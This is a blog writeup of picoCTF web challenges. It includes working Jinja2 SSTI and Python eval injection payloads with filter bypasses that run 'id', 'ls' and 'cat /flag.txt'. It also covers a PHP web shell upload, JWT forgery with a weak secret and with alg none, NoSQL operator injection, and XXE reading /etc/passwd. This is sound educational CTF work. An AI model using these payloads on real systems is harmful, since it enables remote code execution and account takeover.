<!DOCTYPE html>
<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description" content="SSTI2
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website
http://shape-facility.picoctf.net:63568/
Website is vulnerable to SSTI

Based on the server response header and templating evaluation, most probably a Python templating engine, Jinja2
">  

  <title>
    
      PicoCTF Web Medium Writeup
    
  </title>


  <link rel="shortcut icon" type="image/x-icon" href="/" />
  
  
  
  <link rel="stylesheet" href="/css/main.d21e6a19ea346f458ada43307d36e23a3fc456016a2a0ff21dd4f28d1029b5bd96f94ff0aff3fb25ce909d6821efc877f876e44d01fbe1d2648cd5ff58f6c070.css" integrity="sha512-0h5qGeo0b0WK2kMwfTbiOj/EVgFqKg/yHdTyjRAptb2W&#43;U/wr/P7Jc6QnWgh78h3&#43;HbkTQH74dJkjNX/WPbAcA==" />
  </head>
<body a="light">
        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">&lt; back</a>


<article>
    <p class="post-meta">
        <time datetime="2025-08-09 17:07:19 &#43;0800 &#43;08">
            2025-08-09
        </time>
    </p>

    <h1>PicoCTF Web Medium Writeup</h1>

    

    <h1 id="ssti2">SSTI2</h1>
<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website</p>
<p><a href="http://shape-facility.picoctf.net:63568/">http://shape-facility.picoctf.net:63568/</a></p>
<p>Website is vulnerable to SSTI
<img src="4f353aa04b3d12bbc315a7900e2f82ec1cb08d1e.png" alt="a"></p>
<p>Based on the server response header and templating evaluation, most probably a Python templating engine, Jinja2
<img src="790e45b4b52ecadead56b655e917f5c68529db65.png" alt="b"></p>
<p>A typical Jinja SSTI payload is <code>{{ ().class.base.subclasses() }}</code></p>
<p>The app filters certain characters like <code>_</code>, we can bypass the filter by replacing <code>_</code> with <code>\x5f</code>. To make our payload more subversive, we can also change the way we get attribute of an object from <code>foo.bar</code> to <code>foo|attr(&quot;bar&quot;)</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">class</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f\x5f\x5f</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># list the subclasses avaliable</span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">class</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">mro</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">getitem</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#f60">1</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">subclasses</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)()}}
</span></span></code></pre></div><p>We can manually find the offset for os class or we can access the os class through the built python builtin functions. The example below utilise the request class to access python builtin functions.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#555">.</span>application<span style="color:#555">.</span><span style="color:#033">__globals__</span><span style="color:#555">.</span>
</span></span><span style="display:flex;"><span>__builtins__<span style="color:#555">.</span>__import__(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;id&#39;</span>)<span style="color:#555">.</span>read()}}
</span></span></code></pre></div><p>We can access the subclasses of each special methods in function as such <code>__globals__.__builtins__</code>. Since we are bypassing the filter, we can convert our payload from <code>__globals__.__builtins__</code> to <code>attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')</code></p>
<p>The final payload</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;application&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">globals</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">getitem</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">builtins</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">getitem</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">import</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;popen&#39;</span>)(<span style="color:#c30">&#39;id&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;read&#39;</span>)()}}
</span></span></code></pre></div><p>SSTI to get RCE
<img src="bba8bc573237b0886ac577b4a77ac8053e0473cc.png" alt="c"></p>
<p>Locate the flag and read it
<img src="49f56ee14ba09e0c4e03001ff2f7c31334129361.png" alt="d"></p>
<p><img src="acb87892225f893fe9ce19216cebda869058dcf5.png" alt="e"></p>
<h1 id="3vl">3v@l</h1>
<p>ABC Bank&rsquo;s website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank&rsquo;s calculator and read the flag?</p>
<p><img src="1bd85db1970efa6120aa9ec21f77681f843e0228.png" alt=""></p>
<p>Server response suggests that it is a python application
<img src="a7a052a7c0dddf41c3237af378818f7820af78e0.png" alt=""></p>
<p>Payload <code>code=7*7</code> will show 49 in the HTML response. There seems to be some sort of evaluation of expressions. A possibility maybe through templating engine or functions like <code>eval()</code>.</p>
<p><img src="ce9601cf2dfec1bb21d73762471b7efc810d7674.png" alt=""></p>
<p><code>code=__import__('os').system('id')</code></p>
<p><img src="d3cce9327123ae3dbd1dd3ac1f2d7d7af160508c.png" alt=""></p>
<p>Since the user input is being evaluated, we can use chr(111)+chr(115) instead of the string <code>os</code>. Make sure to URL encode the <code>+</code> to <code>%2b</code>. You can get the unicode integer of a character using <code>chr('o')</code> -&gt; 111</p>
<p><img src="95fe163414f731a61344e7ea15135a1c027a5739.png" alt=""></p>
<p>List directory, again we are faced with forbidden keyword <code>ls</code>.</p>
<p><img src="3bf9785d913590dbbba495d3463dca32c83aa572.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;l&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f60">108</span>
</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;s&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f60">115</span>
</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f60">32</span>
</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;-&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f60">45</span>
</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f60">97</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code<span style="color:#555">=</span>__import(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;ls -la&#39;</span>)<span style="color:#555">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>code<span style="color:#555">=</span><span style="color:#366">__import__</span>(<span style="color:#366">chr</span>(<span style="color:#f60">111</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>))<span style="color:#555">.</span>popen(<span style="color:#366">chr</span>(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">45</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>))<span style="color:#555">.</span>read()
</span></span></code></pre></div><p><img src="e719e8e9f3ddc42f19d44a0ac1b86025daf865d1.png" alt=""></p>
<p>The flag is in /flag.txt</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code<span style="color:#555">=</span>__import(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;ls -la /&#39;</span>)<span style="color:#555">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>code<span style="color:#555">=</span><span style="color:#366">__import__</span>(<span style="color:#366">chr</span>(<span style="color:#f60">111</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>))<span style="color:#555">.</span>popen(<span style="color:#366">chr</span>(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">45</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">47</span>))<span style="color:#555">.</span>read()
</span></span></code></pre></div><p><img src="4a8af4b8f62892133b9be92d720ae9939afb9ba2.png" alt=""></p>
<p>Read the flag</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code<span style="color:#555">=</span>__import(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;cat /flag.txt&#39;</span>)<span style="color:#555">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f60">99</span> <span style="color:#f60">97</span> <span style="color:#f60">116</span> <span style="color:#f60">32</span> <span style="color:#f60">47</span> <span style="color:#f60">102</span> <span style="color:#f60">108</span> <span style="color:#f60">97</span> <span style="color:#f60">103</span> <span style="color:#f60">46</span> <span style="color:#f60">116</span> <span style="color:#f60">120</span> <span style="color:#f60">116</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>code<span style="color:#555">=</span><span style="color:#366">__import__</span>(<span style="color:#366">chr</span>(<span style="color:#f60">111</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>))<span style="color:#555">.</span>popen(<span style="color:#366">chr</span>(<span style="color:#f60">99</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">116</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">47</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">102</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">103</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">46</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">116</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">120</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">116</span>))<span style="color:#555">.</span>read()
</span></span></code></pre></div><p><img src="752e089bf9ee5b1e0c6d2c4ef59fcb95098bd891.png" alt=""></p>
<p>Another way to build the string via chr is using join method and lambda function</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;</span><span style="color:#555">.</span>join([<span style="color:#366">chr</span>(x) <span style="color:#069;font-weight:bold">for</span> x <span style="color:#000;font-weight:bold">in</span> [<span style="color:#f60">47</span>, <span style="color:#f60">102</span>, <span style="color:#f60">108</span>, <span style="color:#f60">97</span>, <span style="color:#f60">103</span>, <span style="color:#f60">46</span>, <span style="color:#f60">116</span>, <span style="color:#f60">120</span>, <span style="color:#f60">116</span>]])<span style="color:#555">.</span>read()
</span></span></code></pre></div><h1 id="trickster">Trickster</h1>
<p>I found a web app that can help process images: PNG images only!</p>
<p>There is a server side check for PNG magic bytes, <code>.png</code> in the filename. The form-data Content-Type is not checked</p>
<p><img src="6228fb2ab0e9651962a04999bf929b91aebccaf1.png" alt=""></p>
<p>Note that the Response header shows Apache, Debian and PHP.</p>
<p><a href="http://atlas.picoctf.net:51620/robots.txt">http://atlas.picoctf.net:51620/robots.txt</a></p>
<p><img src="8b2e21cfa499b5b0755d725ab647e03886bdb770.png" alt=""></p>
<p><a href="http://atlas.picoctf.net:51620/instructions.txt">http://atlas.picoctf.net:51620/instructions.txt</a></p>
<p><img src="8bdea46da51c23392516c2c3c5a7b9ee004f10be.png" alt=""></p>
<p>Upload our simple PHP web shell</p>
<p><img src="b65f1e054d90daf95400729222547e6947dbb9f5.png" alt=""></p>
<p><a href="http://atlas.picoctf.net:51620/uploads/shell.png.php?cmd=id">http://atlas.picoctf.net:51620/uploads/shell.png.php?cmd=id</a></p>
<p><img src="f8b87836e8ee397cf1281c0aef8063a5235b212a.png" alt=""></p>
<p>Snoop around the system to get the flag</p>
<p><img src="575f6a3dd381e26ed7772bfc23c7ef52626f3031.png" alt=""></p>
<h1 id="java-code-analysis">Java Code Analysis</h1>
<p>BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the &lsquo;Flag&rsquo; book! Here are the credentials to get you started:</p>
<ul>
<li>user:user</li>
</ul>
<p>The source code is also provided.</p>
<p>After login, user session is via JWT</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#a00;background-color:#faa">eyJ</span><span style="color:#f60">0</span><span style="color:#a00;background-color:#faa">eXAiOiJKV</span><span style="color:#f60">1</span><span style="color:#a00;background-color:#faa">QiLCJhbGciOiJIUzI</span><span style="color:#f60">1</span><span style="color:#a00;background-color:#faa">NiJ</span><span style="color:#f60">9</span><span style="color:#a00;background-color:#faa">.eyJyb</span><span style="color:#f60">2</span><span style="color:#a00;background-color:#faa">xlIjoiRnJlacZSIsImlzcyI</span><span style="color:#f60">6</span><span style="color:#a00;background-color:#faa">ImJvb</span><span style="color:#f60">2</span><span style="color:#a00;background-color:#faa">tzaGVsZiIsImV</span><span style="color:#f60">4</span><span style="color:#a00;background-color:#faa">cCI</span><span style="color:#f60">6</span><span style="color:#a00;background-color:#faa">MTc</span><span style="color:#f60">1</span><span style="color:#a00;background-color:#faa">ODI</span><span style="color:#f60">3</span><span style="color:#a00;background-color:#faa">MTA</span><span style="color:#f60">5</span><span style="color:#a00;background-color:#faa">MCwiaWF</span><span style="color:#f60">0</span><span style="color:#a00;background-color:#faa">IjoxNzU</span><span style="color:#f60">3</span><span style="color:#a00;background-color:#faa">NjY</span><span style="color:#f60">2</span><span style="color:#a00;background-color:#faa">MjkwLCJ</span><span style="color:#f60">1</span><span style="color:#a00;background-color:#faa">c</span><span style="color:#f60">2</span><span style="color:#a00;background-color:#faa">VySWQiOjEsImVtYWlsIjoidXNlciJ</span><span style="color:#f60">9</span><span style="color:#a00;background-color:#faa">.dE</span><span style="color:#f60">5</span><span style="color:#a00;background-color:#faa">z</span><span style="color:#f60">711e4</span><span style="color:#a00;background-color:#faa">aTUJjEORDffR</span><span style="color:#f60">9</span><span style="color:#a00;background-color:#faa">tHMNCkMTX</span><span style="color:#f60">3</span><span style="color:#a00;background-color:#faa">J</span><span style="color:#f60">4</span><span style="color:#a00;background-color:#faa">bHN_kURQI</span>
</span></span></code></pre></div><p><img src="2700ee1ec0b5b0149f80a4ead9ae116bf1ed232d.png" alt=""></p>
<p>The source code is provided. The JWT secret is obtained at line 26 of src/main/java/io/github/nandandesai/pico/security/JwtService.java</p>
<p><img src="4b14ab13cfd2342c65b09615809b1e7ac73d5747.png" alt=""></p>
<p>Tracing the code src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java, there is a possibility that the secret used on the production server is 1234.</p>
<p><img src="8d18addd9eed021cf6859174f9e59dec02338ae1.png" alt=""></p>
<p>We can forge the JWT token using the secret 1234. There are many ways of doing it, e.g. jwt.io, burp JWT Web token extension.</p>
<p>Forge the token to get the flag that is only accessible by admin. The src/main/java/io/github/nandandesai/pico/security/BookPdfAccessCheck.java shows that authorization verification checks the user role based on the userId.</p>
<p><img src="a16fb235da8c869b0ea497c52064ca694862aa54.png" alt=""></p>
<p>The code at src/main/java/io/github/nandandesai/pico/controllers/UserController.java shows us an endpoint to query user information.</p>
<p><img src="45773740696cf6d640b632e34126715638a7b72d.png" alt=""></p>
<p>Our low privileged user is able to access this endpoint. We can get the admin userId and other details.</p>
<p><img src="af528dbb7421895ab15c3fb2ff44a702835e8af2.png" alt=""></p>
<p>Forge the token with the known secret 1234</p>
<p><img src="65f5e8b8e4ad4f8497df9cda997e04353ee796df.png" alt=""></p>
<p><img src="1dd18326238fe6d70c0df9a8c36cacbb49aaa300.png" alt=""></p>
<h1 id="no-sql-injection">No SQL Injection</h1>
<p>Can you try to get access to this website to get the flag?
Source code is provided</p>
<p>Intercept a normal login request with invalid credentials</p>
<p><img src="02619367480672dfa68fa5ae87c586254e34dc3c.png" alt=""></p>
<p>Attempt to perform simple operation injection but failed.</p>
<p><img src="fc684b73f438fbf82f73c2f59d9e144ad7474e9d.png" alt=""></p>
<p>Inpsecting server.js implementation of POST /login shows JSON.parse() being used. Our nested object <code>{&quot;$ne&quot;:&quot;invalid&quot;}</code> in the payload should be stringify instead.</p>
<p><img src="f5518ee6bcf8805bb47b592c277b71b0a42f6c91.png" alt=""></p>
<p><img src="5dc93f24e8eb423bebf8f2377d8461abe723931b.png" alt=""></p>
<p>The flag is base64 encoded in the the token of the response.</p>
<h1 id="findme">findme</h1>
<p>Help us test the form by submiting the username as test and password as test!</p>
<p>test:test!</p>
<p><img src="7b1e41a82ae574cfbb6ca39f40864515e5122421.png" alt=""></p>
<p>redirected to:</p>
<p><img src="807d8de00fdc891af5bbdb504eeac5d304f07e0d.png" alt=""></p>
<p><img src="1455c9f0c1c49d1d9de2a06dc8a2d277f11a6143.png" alt=""></p>
<p>base64 decode</p>
<ul>
<li>cGljb0NURntwcm94aWVzX2Fs -&gt; picoCTF{proxies_al</li>
<li>bF90aGVfd2F5X2QxYzBiMTEyfQ== -&gt; l_the_way_d1c0b112}&quot;</li>
</ul>
<p>picoCTF{proxies_all_the_way_d1c0b112}</p>
<h1 id="soap">SOAP</h1>
<p>The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?</p>
<p>The website has a feature where we can query information via a POST request and xml data</p>
<p><img src="e3fc672a0aa356dcf747df1affc74e7478c50259.png" alt=""></p>
<p>Very straight forward challenge. Simply create a DOCTYPE element that defines an external entity containing the target file /etc/passwd. Then reference the external entity variable in the xml payload for the XML service to process it.</p>
<p><img src="057d1b988cb4fe23cfe3367f15786aac13211e2c.png" alt=""></p>
<h1 id="more-sqli">More SQLi</h1>
<p>Can you find the flag on this website.</p>
<p>The response reveals the SQL query</p>
<p><img src="542ba2e4f4a3ace968d30eff29c27d32bb15e262.png" alt=""></p>
<p><img src="67e1512608f89d3a34646a5ceefd3d115003bcf9.png" alt=""></p>
<h1 id="matchtheregex">MatchTheRegex</h1>
<p>How about trying to match a regular expression</p>
<p><img src="c40bf3f0a36a2e8c3a63481c93ac3286e9bc25f2.png" alt=""></p>
<p>Inspect the DOM or HTML source and we see the logic of how the request is checked</p>
<p><img src="f0493739100936cd7dc123dce079e8d0c5933015.png" alt=""></p>
<p><img src="076e8ce99dfb2deaacd531ec209a61d9ec351499.png" alt=""></p>
<h1 id="power-cookie">Power Cookie</h1>
<p>Can you get the flag?</p>
<p>Change the cookie value in the following request from isAdmin=0 to isAdmin=1</p>
<p><img src="9c972a90123d6af395af2b88dbdb37a003f24183.png" alt=""></p>
<h1 id="forbidden-paths">Forbidden Paths</h1>
<p>Can you get the flag? We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?</p>
<p>Path traversal in file read feature</p>
<p><img src="a912b3f53f54f844de73932a71026ed242209715.png" alt=""></p>
<h1 id="jauth">JAuth</h1>
<p>Most web application developers use third party components without testing their security. Some of the past affected companies are:</p>
<ul>
<li>Equifax (a US credit bureau organization) - breach due to unpatched Apache</li>
<li>Struts web framework CVE-2017-5638</li>
<li>Mossack Fonesca (Panama Papers law firm) breach - unpatched version o</li>
<li>Drupal CMS used</li>
<li>VerticalScope (internet media company) - outdated version of vBulletin forum software used</li>
</ul>
<p>Can you identify the components and exploit the vulnerable one?
Can you become admin?</p>
<p>Credentials:
test:Test123!</p>
<p><img src="984a6c5c683d130c7bf3f1edf32ab2e5ff9c50f4.png" alt=""></p>
<p><img src="894099b670966747f24766b8138e9a83b972b705.png" alt=""></p>
<p>The JWT token set is vulnerable to header attack. We can modify the header to specify &ldquo;alg&rdquo;:&ldquo;none&rdquo;. The server handling the token will accept none algorithm and not validate the signature.</p>
<p>Change the role from user to admin.</p>
<p><img src="99cb59db1f05751e577ac6e87fc5ad537a8af0a3.png" alt=""></p>

</article>

                
    
    
        Nicholas Ch • © 2025
    


            </div>
        </main>
    </body>
</html>
